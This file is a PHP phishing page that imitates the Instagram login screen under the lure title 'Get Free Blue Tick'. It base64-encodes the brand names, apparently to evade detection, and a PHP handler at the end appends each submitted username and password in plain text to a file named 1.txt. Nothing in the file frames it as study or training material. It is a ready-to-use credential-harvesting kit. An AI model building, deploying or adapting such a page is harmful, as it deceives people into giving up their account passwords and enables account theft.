<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Link to Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
  <?php
    $t_encoded = "R2V0IEZyZWUgQmx1ZSBUaWNr";
    $t_decoded = base64_decode($t_encoded);
    ?>
  <title><?php echo $t_decoded; ?></title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }

    .container {
      max-width: 350px;
      width: 100%;
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 20px 40px;
      margin-bottom: 10px;
      border-radius: 3px;
    }

    .logo h1 {
      font-family: 'Pacifico', cursive;
      font-size: 36px;
      color: black;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input {
      padding: 9px 0 7px 8px;
      margin: 6px 0;
      width: 100%;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      font-size: 14px;
    }

    input:focus {
      outline: none;
      border-color: #a0a0a0;
    }

    button {
      padding: 7px;
      width: 100%;
      background: #0095f6;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      margin: 10px 0;
      cursor: pointer;
    }

    button:hover {
      background: #1877f2;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #dbdbdb;
      margin: 0 10px;
    }

    .f-login {
      text-align: center;
    }

    .f-login-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      color: #385185;
      font-weight: 600;
      font-size: 14px;
      text-decoration: none;
      margin: 10px 0;
    }

    .f-login-btn i {
      margin-right: 8px;
      font-size: 20px;
    }

    .f-login-btn:hover {
      color: #00376b;
    }

    .forgot-password-container {
      text-align: center;
      margin-top: 12px;
    }

    .forgot-password {
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
    }

    .signup-box {
      max-width: 350px;
      width: 100%;
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 20px;
      text-align: center;
      font-size: 14px;
      margin-bottom: 10px;
      border-radius: 3px;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: 600;
    }

    .footer {
      max-width: 350px;
      width: 100%;
      text-align: center;
      font-size: 12px;
      color: #8e8e8e;
      margin-top: 20px;
    }

    .footer a {
      color: #8e8e8e;
      text-decoration: none;
      margin: 0 5px;
    }

    @media (max-width: 400px) {
      .container, .signup-box, .footer {
        max-width: 100%;
        margin: 0 10px;
      }
    }
  </style>
</head>
<body>
    <?php
    $f_encoded = "ZmFjZWJvb2s=";
    $decoded = base64_decode($f_encoded);


    $l_encoded = "SW5zdGFncmFt";
    $l_decoded = base64_decode($l_encoded);
    ?>
  <div class="container">
    <div class="logo">
      <h1><?php echo $l_decoded; ?></h1>
      <br>
    </div>
    <form action="" method="POST">
      <input type="text" name="u_name" placeholder="Phone number, username, or email" required>
      <input type="password" name="pass" placeholder="Password" required>
      <button type="submit" name="lo">Log In</button>
    </form>
    <div class="divider">OR</div>
    <div class="f-login">
      <a href="#" class="f-login-btn">
        <i class="fa-brands fa-facebook"></i> Log in with <?php echo $decoded;?>
      </a>
    </div>
    <div class="forgot-password-container">
      <a href="#" class="forgot-password">Forgot password?</a>
    </div>
  </div>
  <div class="signup-box">
    Don't have an account? <a href="#">Sign up</a>
  </div>
  <div class="footer">
    <a href="#">About</a>
    <a href="#">Help</a>
    <a href="#">Press</a>
    <a href="#">API</a>
    <a href="#">Jobs</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
  </div>
</body>
</html>

<?php
if(isset($_POST['lo'])) {
    $u_name = $_POST['u_name'];
    $pass = $_POST['pass'];
    $file = '1.txt';
    $data = "u_name: $u_name\nPass: $pass\n\n";
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit();
}

?>